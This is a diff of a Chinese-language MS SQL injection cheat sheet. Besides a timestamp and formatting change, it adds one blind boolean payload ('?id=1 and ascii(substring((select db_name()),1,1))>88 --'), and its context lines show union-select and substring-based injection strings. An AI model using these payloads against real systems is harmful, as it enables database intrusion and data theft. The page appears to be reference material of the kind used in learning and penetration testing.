@@ -11,7 +11,7 @@ draft = false
  * @Author: reber
  * @Mail: 1070018473@qq.com
  * @Date: 2018-09-04 10:45:01
- * @LastEditTime: 2019-05-13 15:14:27
+ * @LastEditTime: 2019-05-13 15:32:28
  -->
 ### 0x00 基础信息探测
 ```sql
@@ -94,8 +94,9 @@ select id,name from msg where id=-1 union select top 1 id,name from test.dbo.sys
 ?id=1 and substring(db_name(),1,1)='b' --
 ```
 
-```
+```sql
 ?id=1 and unicode(substring((select db_name()),1,1))>88 --
+?id=1 and ascii(substring((select db_name()),1,1))>88 --
 ```
 
 ### 0x03 Stacked 注入
